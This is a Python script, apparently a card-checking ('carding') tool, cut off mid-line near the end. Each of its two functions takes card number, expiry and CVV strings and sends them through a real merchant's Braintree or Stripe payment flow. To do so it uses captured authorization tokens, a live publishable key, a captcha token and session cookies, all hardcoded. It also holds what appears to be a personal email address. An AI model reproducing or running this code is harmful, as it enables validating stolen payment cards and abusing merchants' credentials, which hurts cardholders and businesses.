import os
try:
    import requests
    from bs4 import BeautifulSoup
    import random ,string 
    from requests.structures import CaseInsensitiveDict
except:
    os.system("pip install bs4")
def b3(ccard):
    card=ccard.split("|")
    cardNumber = card[0]
    cardMonth = card[1]
    cardYear = card[2]
    if len(cardYear) == 2:
        cardYear = "20"+cardYear
    cardCc= card[3]
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYzMzExNDksImp0aSI6ImQyNTA2NGE3LTQxZTgtNDE5YS1hMDY5LWFhYWFhMGJiMDk1MyIsInN1YiI6InZucTJ5MjczMzI4a3YyOXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZucTJ5MjczMzI4a3YyOXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlBsdW1id29ybGRORVdHQlAifX0.FwSfpYIlcU2jslr11DZaJjq2nMPpvDgES1GG-jMF5KA47-CzRsnkpjllhXEv8Tq4dJ5hqq5MP6ogDVDfX9DxOw',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '373094f1-71ed-4627-8cfd-34c6465512b4',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cardNumber,
                    'expirationMonth': cardMonth,
                    'expirationYear': cardYear,
                    'cvv': cardCc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)



    token=(response.json() ['data'] ['tokenizeCreditCard'] ['token'])


    #2 requests

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.luminati.co.uk',
        'priority': 'u=1, i',
        'referer': 'https://www.luminati.co.uk/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    json_data = {
        'amount': '9.00',
        'additionalInfo': {
            'acsWindowSize': '03',
            'email': 'rahulgan789@gmail.com',
        },
        'bin': '376761',
        'dfReferenceId': '0_43afe3db-ac3a-48e4-931c-6b09e5968f7d',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.86.0',
            'cardinalDeviceDataCollectionTimeElapsed': 248,
            'issuerDeviceDataCollectionTimeElapsed': 6997,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYzMzExNDksImp0aSI6ImQyNTA2NGE3LTQxZTgtNDE5YS1hMDY5LWFhYWFhMGJiMDk1MyIsInN1YiI6InZucTJ5MjczMzI4a3YyOXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZucTJ5MjczMzI4a3YyOXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlBsdW1id29ybGRORVdHQlAifX0.FwSfpYIlcU2jslr11DZaJjq2nMPpvDgES1GG-jMF5KA47-CzRsnkpjllhXEv8Tq4dJ5hqq5MP6ogDVDfX9DxOw',
        'braintreeLibraryVersion': 'braintree/web/3.86.0',
        '_meta': {
            'merchantAppId': 'www.cartoonstock.com',
            'platform': 'web',
            'sdkVersion': '3.86.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': 'f997a117-6ac7-42e5-8d99-6d4829d26272',
        },
    }

    response = requests.post(
        'https://api.braintreegateway.com/merchants/vnq2y273328kv29q/client_api/v1/payment_methods/'+token+'/three_d_secure/lookup',
        headers=headers,
        json=json_data,
    )
    
    return response.json()

def stripe(ccard):
    card=ccard.split("|")
    cardNumber = card[0]
    cardMonth = card[1]
    cardYear = card[2]
    if len(cardYear) == 4:
        cardYear = cardYear[2:]
    cardCc= card[3]
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    data = f'type=card&billing_details[name]=fgdfg+dfgdfg&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=F%2C+Arun+Court&billing_details[address][line2]=Amethyst+Lane&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&card[number]={cardNumber}&card[cvc]={cardCc}&card[exp_month]={cardMonth}&card[exp_year]={cardYear}&guid=6eb54d28-1b54-4e6b-bda7-8238d552e80c5ffe56&muid=fd35b4a4-1eb5-4f65-af41-c687a79f4a2b1e5514&sid=9e3213f1-7220-413a-be6c-e49bdceb41a7851eb5&payment_user_agent=stripe.js%2F8a1c35bc56%3B+stripe-js-v3%2F8a1c35bc56%3B+card-element&referrer=https%3A%2F%2Faccount.nugs.net&time_on_page=41488&key=pk_live_MJDfpIxO8RB4oyScENuE3JqM&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiYkVYU09BVTlUcGpVbDZoNnN4eEpGWG9WL0J3S1piOHBDdUlkYWE5cjdqbVo1b0d1Vm13cnJxMFpFMStCVmNaR1VZT0lmUDEwT1VmRFk2d0k4dXc1N3huWGhURkNRa2lyR1BKMldjY1l2QXlCQWZFTkNHVUpYVmh1UDBLZVRYQmhFTlA3SUhxRWZHSks5MnJjUXpNbmVxTlA3MWNwSHB3VlJrRi9zUEVTN3gvalJUcmFtY1JCckVxT3NvWkczWXljK0dLbUw0bTZLanJPc3lPT2JkYjlFb2hQV2xodldmK2VLclJOSWFwQm5JUUg5WUxJTXlFc3d2c0p3OXlxUWRYL0ZGTDJBUU5ad09kSTk0MUovMHNzenIrQmFIcU54VC8wNTNIeUgvUUhOdC80K3hxdmhZa2dSSjNCT0pHcUNjZWoxZGxpeGZoempaY2Z0UUc0bkl4a3daYVJlUDlPTzl5TkQ4aGl4Y0JDNnNKUDY2OXlxTVRCUG1WL1BWaEFybEtxcUMwSXhHTjBhTVpCWFdtYm8wZjJ6SkpiQzNpbGtzdGVVVXM2VkFadDFaQThMSzZBWktXbXptOFppRmJHaEpTUGJpRW9BbG5xYmxBbGxFMGdsellwQm5aY0RzNkUra2xFT21UdjRMZ3ZPbWVMR1g2YmlkVDlIcStaY29OQ3BHM0ZFMEhRcmRCSGVOeTFJMlhwai9RNXBKYkN3L3phL1gyVmpKUSs4SjFUNWRBVW54R0xHKy8zVVNHR3dQNWxIb1RGWVJucWZITHlOZmFpTndkSm4xNTc2Y1UxS1F4ejdwMFdFelFxMmlZWG9RYmRaQXpQV3RYQVlKUG13YTVSZEwxcGlCSjBMVFE5SXZRMkFMeU00MG9XS0ZwSVpqNVgzeFJUVFhnSDJyOXBveFJjdHcwMGlvUStCWmlzaEtkTklaMGdTbnBOR1RsT1lGcE01ZmtYMit4QTIycS9kUWRQMFRSMGdSRWFQYVhSd2pNTit4YVZwazJQYWhxck1lak1POW8rSzl2SWMyOWRyQ0xTeFN5aDdJVXcyWlR1NXBkbDNvc2tNQnU2M2NCUEJQdnFnbkNoRHpGcUN0K0lEVHg3N1c2cDZwNFBSalMvWHlrZjlUUnVRM21sOVRvRlFiRnJTMnVsTkYvZGZrelFZV0NiK0hsM3p5em9EOUwvYVozQVVnM00vZXhwekE5eC9naUZKb0xldW9TUkw2OEExb2hNMklKQnQ5aHJmckdEc2x4dXppN2RvRkJHSGU1MzEwY09TQzdzZ2p2SE5vdzY1a210RzhMYkFFRHpNMlFNNGFQYUt3M3lhdENTK3ZLenFWVlVEK0QvcERZRDJsdE9FYzR1UUErSGZ2TG9kWHVMb3M5QlhzV2lKUk9pSW92TWdTcHRHUTNDUU5aY3pmZGNBY3EvVm1mWHo3dldlK0xJbVJkWXhtYTFXall3ZzgzaktFTUFKUnpLV2cxVjVaWEpTb2EydGJsdGdEcVZnUGRaR2pVTHdxZitTbXE3eHJSc2xKWXlvRy9nRmFwTThRc3lOcm03cDBFSXM2SFJRVmJZWFVKazFTdTRpRnJrV0NnN1BUTGpTNDZHT2V5OHFDbG9FUWhNUTRlWGpKNEdQaXBkNUl0OUFEL1R2VHdPdzQ4andLTEpsSFQ4ZHVwSlhSdC9sUTRSN0JNclRnVE5VT25CRk9ma1l5NUVraUJSNm55RTQyZG9UNDJRWllZWWt2dzVyeERRYjdtcG9YeFdHK3pSMnhUeDVlWVRxbzMraDBRQlVlQ1Q3MXFPRDBwc1loQndKYkpycXkwL1hIajUzSktsZTR2YXpIdmZGSmtMZWwwcWFpb29rZ1F6RHMrZlloOEhYeUlCVmxDSSswK2hjWHdsaWIvUCtJY1BqeUM5Tnczay9DSnNiaHM3OXFFaHB4czJuc2xBOXMzTjN2amxqZGF2eFNZNFNjSnN1UkF3TmVlZ2huZU5aazV3UXo0bmQ2WTBWU2VmRjFtdE5lWktJV1ZsaHVUVGh2WEZuUTNLeE9TWUY1K1RPc3pKQ2JlV3dzQ3ZUUGtTSjloM2hicGpPa0h5RktPNG52cVFudGxObnZrbHBOOVJnTEJCbURxNU1tdFlwYWxBcjUwekpCc3BhekxmaEtQcFJSa2JybmxZdGNFQ3NhZ010NUVEcDlRUnFBQnY1a1M0eWt2eVA0V2dBeVhiVzhnb3VxVDl5RmxLbGlaS3A1ZVB1R3NWOXpPNWo5Wm85QUJKUmhySVk4TkFkZitwYS9OZUNQdThQbWpRRDFUaURiR0M4ajJCZ3ZYU0pNTnJDYXlkODBEd3J1MkdiWGJTRTl1SkJwVTNxekwvN0Zxc2tlTENZVlArUmc2NzFVWmRpeFlUbkxVSzFiVzRjZEd3TE5xZjBqNUprUCtQSTZxMlp3bkFtQnFMc2VuTmVNa3Z1dzcrOXErcFpyVWVRcW5ZSVVBOStyM0kwYWNwWEhTQldrN2lTZDRabkRVMjdBbkRUcCt4aFZXT3VIVTNZb0RHRHBzdkdSVGlBZ0IwSHpWSGIxYXJBTy9zQW1SaEJJdkJwR2NvNTdoTTVqQytpbmNkY0ZueGorKzVQcTdtN0JoVGhlTnZ6NVljZnVBcUV6RURHUHJaRndORzc0U1RtNlR6RlNpSjV4TzErTGFDdnlidldBMCtPODBidU1TeWowQ2xtdXNuQ3BOT1ZJNUVVOHpGWU9KNUxITFowRkI1VUNyTlhsbWljOXJ3V3J0WjVuWVVKVXBtalhyR1VnQkRKZVJJWmY4YW0wdk5Mdk5kbUZveDBrWENhNGdhOGNtMndaVkJNN3NscW11ZklnVjdDMmpERCs4SWhMNmxaMWxEb0NCVDhJbk1rOFZ2U25LMXBvcWxuYzliMUNSZGdnazNlMVhFSWt0UkxUN1Q0OVRMY043cGZ3citEdHZ5L0RRYmR6cS92ZS9yUS9yZldGWnNReHl6OFdkbnp5WXYzWXpEbzFlWDlhMXRUWEx4eVZqSmhLYVo1b1ZZbHZqR0JMNVFLaXQ0RkNockdWTjhmMTJuQnlKKzM0SUJNcHorSmpqaDY1QjFmMGtkNWJOTlpWOFBnSWpzMDVNelc3Y3ZjNzc0azBzeHR4alIrVmZqRUdadk1CbkFHdVNnYmpLLzZSQ1l0czRmc2Jvb1FNRksvbnZ0IiwiZXhwIjoxNzIzMTgyNzgzLCJzaGFyZF9pZCI6MjU5MTg5MzU5LCJrciI6IjFlYTcyZTEyIiwicGQiOjAsImNkYXRhIjoic1F5Vy9qZW9UdHJzcE9BUnVpTmxjUnhSVlBaVmQ5cTFpTVJjT1BRTUF4bnd6YWx6YXkwMUNhUUM1eE02YWEwVEFXOXFxZDUzRzRVeHlzSkoyYkxnbVV5Umk4Ni9YUTdhTlJ4SVE0TzVxdGdUK043S1FmN0dDSEdRTTh4aDFwN2R0N3BKWWxsNGF5dEM5Nkg0MjlsaHhOc1hqVG5wdzZINVVmeURqMCtUUEhQVllCYVJyT1FXSGRHMjdYdmN6Y1FXT0UzVjJJTzVIak5QWC9XRiJ9.w0s8s4u8dRd7aR-rIIk0Q5RlI1usOXc32ELf-jFWNDA'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id=(response.json() ['id'])

    #2 requests

    cookies = {
    'optimizelyEndUserId': 'oeu1725690629128r0.6116024977063532',
    '_gcl_au': '1.1.211985175.1725690630',
    '_ga': 'GA1.1.2005423188.1725690631',
    '__cq_uuid': 'bcFVLhbyUZ2rJZubsYsangICYy',
    '__cq_seg': '0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00',
    '_fbp': 'fb.1.1725690632354.49505411930954871',
    '_hjSessionUser_3013110': 'eyJpZCI6ImExY2Q1MTYxLTNhMmYtNWRiNS1iNjhiLTI5ZDk3NmRkOTAzYiIsImNyZWF0ZWQiOjE3MjU2OTA2MzE0MTMsImV4aXN0aW5nIjp0cnVlfQ==',
    '__stripe_mid': '54fd0b72-0c5c-4fa3-8d4b-27ac1fd1e891213156',
    'AMP_MKTG_504fd29315': 'JTdCJTdE',
    'amp_session_504fd2': 'yOq8oHrIU_VNrDbRY05_x8|1726244436459',
    '_hjSession_3013110': 'eyJpZCI6IjM0OGJlZjQ0LTg1ZWEtNGVjMC1iMTc2LWU2ZDhlMzRkOWQyMCIsImMiOjE3MjYyNDQ0MzkzNTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    'amp_504fd2': 'yOq8oHrIU_VNrDbRY05_x8...1i7m2vefb.1i7m3016v.6.3.9',
    'AMP_504fd29315': 'JTdCJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJkZXZpY2VJZCUyMiUzQSUyMnlPcThvSHJJVV9WTnJEYlJZMDVfeDglMjIlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNjI0NDQ2MjAwNyUyQyUyMnNlc3Npb25JZCUyMiUzQTE3MjYyNDQ0MzIyMDglN0Q=',
    'nugsnet-session': 'XbKsSKa7cX2JSQdJkvmbSdKLeK9zY9ySIt6NMKmpd8h9pH9neBmN%2Ba1s6XEPlcwKEp5ikmz%2FhRzRxdZlAYkJU2MYqc%2FJOM19XQIQy6oOnwVdrzxhnH4OSNV5P5n0lAonsgVr1GrLiN1jmaI3XusoLTsqrXnoTCT0RiZeVT9a8iOZmmLP%2FQ8RxFURqVqasjCN2pRG%2BE4vCX6iYeLYdho%2FhuGXd%2BIFxOZYUwp2%2B0jSUBQiuQ44TcoihyOMEj1psYNCKtOGhP2lC44CpFfsKGvV6p5cAj6o%2FHDwkvnYO7K1EERlhC0%2BmSwoGz4mhY7q%2BSMNNodQSKC7ryFRGR6W9QVbAd6u4L6D4uDoNw0toKQHFG7KlP1AS53%2B%2BL%2B%2BxER58pr%2BHQD06vS9Lkvaw3rfW%2B6Ce9hz1UPjlwTu%2BlNahFuHyS3ypj%2F5uere9%2B%2FjNqpDfKAGmO61V3pRcBurNFnxlMwetQp%2BzrC0GZeC%2F3VryqZRWyKYE3D2OULNuHXb3vjC4zm0cMNokzT4y507ojQa3IwICJbhF1luv27fVbWd8lF40jc%2BLynQMZWnVtNMB%2BRuLRtxp%2BkwCmPKT2FoDMjcCLgtXgJJCDxHUgVh1DQfFmIq2nah3KQFzUP8jxq52xM%2Fc7jXHAU1DKUdywva%2FE%2FmEMyNakfJ17pOyUBZxzzrgVzqr%2FziiJ9XoeNq%2BScq%2Bb1xNdsN%2F%2F0%2FAb9DttDwWM1RD3Cy9GcF5b26E%2FoWHV%2FiCC2OgcAo3qozmCdZw9zI26bKA9iFhgi52vJXa2PWAAhu3pKCwEJ9X4lWdkO4iDqQhqtks1xaei7DgMwjfNMiq%2BG4cCrYXdhomxMes6tzIW1BxOa3tL5uIYbf4mZCvyzcx57269kSlYxaMa81fhXGt14WJRdxkZnCjMp%2BD%2FpRHkD%2BgxLedNjNndDJH32muOAWrLUcCI4Svry7pUwu%2FnjD9AaeYT7JgttYeWi6avMJoMvU2DwevqmJ%2BdXesVrpsXqm381SQEJFVMNi2nkf9ohOTfPW%2FCKyTPx3PND9wfzlG8t2q5RAQ2UL2Ru8S9vMDy1MK5WJZqDWxQ2slTO8%2BNYT6I9W4BOALB0Xt5VHZ1ADPEml8muk3UXy7HFMT3aOrBR13teb3WEuYxcoRONc6erf2CoI58u0h8GU2VD3siMyaD%2F5WQISye%2FVrmex3wE4yaXrp7CKJij7ulw71NVMMmWuibbHYTM8yjxsEMMNh0PXnMKg7oonfFmfaGj6sT%2FgXqGlRlrzX%2Bw4ongI37TppJxhVTA8t60f%2FztieBSZGFbX16ApTfdQSUBY5P6wUh1yB6Tb765HuzA2TsyZzcAkd6yVRTsUIt3nJgnK0qaYTQ17%2FbnSLUm5VHyBQmN107m6gR61B6ifjGSvnL2ZS1tHpDmF4ePc73yOGx5wVWfYdfoX%2FMiH7N9%2FBIUcAE8EP6E00H9woDSI0UXAgTjF7sjB5PTP34kW26%2FlR9Nwrk2NZwANQjDPg1plYThCg0%2BGuapAP5rzocFFTUv82XnYwu7vInX4h8O3qThxUORJkjistsD7LK3I9TZK6eQtVLKrA9uiFDzKZWor6h76I67LFIxOCpyAARtirccw02wWKo%2BwrTlrW%2FeZPOsNkY1ct7%2BiVaa%2FD9ZlF7UsUr9YOC5IPRuwOuTJA9X1S0RuqwbLzvhf%2BC9Xmio6Db8CYg64uU0gbh9ZH7V5JTr4cJokDTnSBcOAUe3Vas3xt11neVciC6bGDkQJgu2SnZeLXTuqK8iR%2BZDZWX4vWgOuFdSnaPQRYFgY580danf6T8%2B93KlBZxY%2FVdfLR4nvWJgyqaaXHGiEEtciyx2KiBrIwP7wfqOpugs9gnJ%2BiFPkoFl3RnfIOmQQ1FQcCV5Sy5uQgALDck4321OLOFq85nQPdmGUSaSC%2BbDvF1REy2z5t4MSTHffPCCmwtHS3J9%2FL8vumHhDvAA04Jx0kSj1t4rV%2B4KB5GLeK9vGFo3XmVJPF1L%2F9ucjGjkA3K47kKV%2Bi2nQ1f9Pt7mGDzhaznF8epKoyI7DMq2kVMsbX8RDskaqTXwji%2F9zufpBBAduvfm0GKAg1%2BuxpBPEAYLVhCudHee3r2D0JHg5F%2BWU8P368M66n0hnL3TV746692cylEaa%2BFuX2iFesBKg35kMU8AewRKmWQMfDiii2N7zpP9xYbvxiNFxdcaT3DJt1Mwli1fMeVzGktdoxFrEBKUUsyKiVIZ8RxHKfQHRh3BMNPEnQiz9VWkvJZVSidTJGOv5VIQunpRZvkTV2pQ6uP7mq8khpXXURgmmKKiHwz0Tp6oNocyFOgc1xA1NQUj1i20O6H2GyxPr6ZK%2BruvcWQTVniVqvLQCDYSjUIUrm9igEP1ow%2BPZNUBvIsx3I%2BzxLEgdJHavmXsVT8fJau%2FKIlJdnquzg1RNoFpkzoNuV%2F3tuBUQH1xrf34WUAIoeHyc15o36lVomf3HvG%2FLYbRQFKGZGbn55VV4S1pkcRZJPfmXesoVstKsQbFZn%2Bduj9LVC48LRAcCHhz40%2F7XaTmPp%2Fgm03JvcVlsdUjitwteVgo%2BQuqvK8ml%2B5SPbsQc%2BX%2BqSCrrOMV1bFuamBLGT71WDKaWpfbtZGc%2BivAhKx25eoO1%2BVZHEJMOOqiqGW5BxiU3tBnymmysz99iAQNxIupBT%2BndaGBjDtRZ7rINIGuvINv%2Fi5o%2Bbkp33jUNB3uJU7U8ch7ASjSoJNw9w4xqF8tACpxuUu5gvxzoDEgFHq950ayaHFkb71CqnZK1h17v%2Bghn%2BRhLJlyjmPLW4L2%2Floo7otXJXa5A2ysTCzO2effiLIbzSH06T7xMvR7Gm%2BgAoS57f%2FSGeOzmGiZRPIYNSm1KRQ2uYufQPeUyomiLyuW80oigshkdsta5BCRTFCzKC%2BJq4RlDhyTlT7wPLfbBB%2Fkv%2ForvdvBkKGc1Y1rYjGOrSEKxFf3Tiav2HePUQpUs8mirh9QGtbO7Lcgc3ATXJhUA84Jvi3bIOTuxz2ZJyo9RZ5IhiVn9EOWE3N3Oxj%2B0X0DjVt0GokJLjPGu4aaBAS7WDIwTQiFAwX6nxVCQQCp0DzqWIOJZ6WqGmkgNLQTHXBjqVBaglGdFE2uh%2FEGF71q4EfIbmKcKimVBYizARqjbIpyqTrE0s4ktt8NBKdPMtdMTFzss8w0piXE2xvI%2B0n%2FzGL9AciXZUSmkGKzhiRwHH52dl0jI84f1G%2F5oxz66cRpqGwu33v4Sduvli8NAtTkqknvVRExPUCK6tTT3uAwRg97CVCrwl8pbb53xnMVmIV4me29oryyY9q4autQ76wTRlamFIVSwx%2FndePtMaKWxbnLNa6mUS3%2B%2FAYk6VUT1UzT2qLX2G%2FOTgmd4XBPmNDk9bdaM7YsTiMdCzgvSg%2BK1z97tMsb%2FQr9m8lzUiBWZDF2oIpK9DS%2BSAePIv3cGQrsBUfE%3D%3B%2FUUJfv2ii4zTaW8JRPJ0zg%3D%3D%3Bq3FqAUSDZeYjplEU',
    '__stripe_sid': 'dfcb4c36-9302-433c-a1b9-b7c4b9771d4f4c47f6',
    '_ga_SVB3VG3YGK': 'GS1.1.1726244438.3.1.1726244525.45.0.0',
}

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'optimizelyEndUserId=oeu1722715141141r0.6783502342747523; _gcl_au=1.1.176693772.1722715142; _ga=GA1.1.722916375.1722715142; _fbp=fb.1.1722715143583.19772876210144294; _hjSessionUser_3013110=eyJpZCI6IjdhYTBjNjBjLWNiMWQtNTkxMS04ZmUxLTIzNzg3YjgwMDkyMSIsImNyZWF0ZWQiOjE3MjI3MTUxNDM1MDMsImV4aXN0aW5nIjp0cnVlfQ==; __cq_uuid=abxHhQaYA60z58aFNULStsnljf; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; AMP_504fd29315=JTdCJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJkZXZpY2VJZCUyMiUzQSUyMnJBVzdHdnR6N1lFVEI1bXdwaWFYWTIlMjIlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMjcxNjY5Njc5OSUyQyUyMnNlc3Npb25JZCUyMiUzQTE3MjI3MTUxNDEzMzclMkMlMjJ1c2VySWQlMjIlM0ElMjIyNjkwNDE2JTIyJTdE; __stripe_mid=fd35b4a4-1eb5-4f65-af41-c687a79f4a2b1e5514; amp_session_504fd2=rAW7Gvtz7YETB5mwpiaXY2|1723182626890; amp_504fd2=rAW7Gvtz7YETB5mwpiaXY2.MjY5MDQxNg==..1i4qr0e2a.1i4qr0e2b.i.0.i; _hjSession_3013110=eyJpZCI6IjIyYzk2YTM3LWI3MTQtNDQwOS1iM2RmLTk1ZjgwOTc0NzNhYyIsImMiOjE3MjMxODI2Mjc0MTMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; nugsnet-session=yUVSaepCJR3BZJKubsu0AoICMJUBIR1VUYQtf7GtTEmZUL5NXlbmqcqhc1WbB79TOtHNgW2jSJ2jG%2BPBRM3qz7pqhSNttgpHmLzPlPpgRxGi7%2B4DNxjaiwjwAar2e65ZrHwddj60TkCviqE6G7ykJIXwdva1Jra1%2BqbiBPQllqAnfAyQvUqqL4Advo0YxZMv7i%2BwGyJ6t3x1erPEtkdp1wx%2BOSKz05IOz%2FNkrcCMJi5C9xXtbT0x70x8BTuKbQqHJBfUVBALudyiUTmJj7z%2FyuEzuITStg8A3iZ1CD0nkS%2FtvUJ8ZoigmjSZMyBXxsv9CfC0AVQnAVteuKB%2B6d9Bl7lgX0EjZL1GZ4EHOe00hjWwOZRAttpTZYrZee%2BSQTHL19ta9UJjmwEG1hjKsK9aiXUf1snJ38hJMpMejQ4zjOtBwRbFMwuS6yILddf0riFgDt%2Fo3BoYoznGfiKw8V39e9ibkGrR0%2F%2FABJjTFPn4ZTnG5wVEoHwfkMzT475Ncg5fb63ozH8RtjjTRBDPl58Rebysy7KN9DjZNu59y4t7imUYkLYpqCxmmRI%2FEunnQALhcb5WeGVeF%2FGTOAhk3WpqJSBW%2FATdwPXVV8vJ52t1JvzAFIPyayXRUYLvx7QCp%2FhcT1CLMd9N9yHWBVDw8qVODXp4s8YaWieAE09qwQOVtCbtIbg3ya56BESxbhnLPBGIj1mdZgq00R4MPEG0U%2BGD0nd4DkFDP9hH5%2B9b3J5QfA0Xp43TflE%2FplQ4Gh81E46nhA1GcehlHozyZfwfFFkL%2BZcOhgkqJN%2FRIq6Uz%2BFWFeSS7F%2Bw3r%2FCd%2BwH53xAivSKQMbxq%2BAt8hjz6qocgTbEuc5ImTB%2FPcobRm5FJsNZ9uxRix2S0VnXNymv%2BkdiybBOI7Zuw62ivRXlKXoNyBgIMHOnfS55Irg1fmDDYwrFY0iRfhHjIOehWegdXcGHSZnBH8%2BzEI%2FaZKaTkLV0Zcs1XtDWhxIu1Di5AmxtmgynuZLl4qX66F0nhEZw5hCfQC97Xf5Ty%2FZ6aZUS66YDtWCFfsIsje5wm1kL5R54S%2B74l6U5p%2B4lVkZezJ5HWInTljy3R19tkZ%2Bvmsr0fwgw0iYmJhV73SFPcs8VSImSYLwiUafRZWV0i4R7KxiRLScBK3eAcwBQgUvhpEDr7fygq8q7f37HlBdAxFYkdgGpDHLb0aml1valai5EX06tkFo7hlMtNZQYAJjhdjJib1OhPg7gJCyIqtyP4pfnIGM0Hcx8bZE5dBe4088FtlaZUMUiaRRajdiKd%2F158ltius82e7I%2FWQijm8XnGE27icZp2Ec8JxcjIiz8t4PFcYJRt4HXu94qYNH32xZUJVmazeglokjoZ5zX%2FZ4QHYSXUxvhK5WNd3UCMg8lq%2B%2F58W37t%2F3fxRSCZdk1w5T0agpL8xqOPW9BCtIORVJ6fPhpxz9IEWbp8MAvZbDqaa5eV7WomabL0jDKAKchghZaL7nkgY4D4n9BQMpnBtdmnxIxIhHT%2BYK1ctSQiaSY4zXCn4CmijODtgU20KEjAkwSivLPnlvgTJ0tQ3ralttVZEwBBw81DzOONF9W94Qju6QAN51ftiOQjR2%2FSF8MoXo6Bi8QT4onOlNsYzPtV8G5k1NrfqYl0crqyXOQtgOUN5QvweL5SHui0lvMsJxfdvRLNzGLfENgFaim3qNgAQfGYJs9v9cl87H7CEuw5jDVtA3mxznjpeZcZ%2Fjng2gwJf5Px%2FnSB36RGE6gE6e8ptfxw0oBPGYkN%2BsEwMWHg%2Fh1IFrucyVmkOFbPV1UGEzkY%2B%2FIRN1Q%2FAFjphDeJ04qLna5w34JbNL30Qd9gUQYBhyMAgGwHra7BPll0HUBJdMye72jkzrzemYF%2FE8xTWo4MDVZnr45yxPAy47gzxgvTNQMnh0f5HrywzM7zarxTCW3vqr5%2B8xLnLUIJby0izk660QA5cChRFU81Mb1jq%2BVsyenDg6yT3ngnywR1%2FZnVbcmuVM8hCOWCyqn%2B9z0Tpq%2F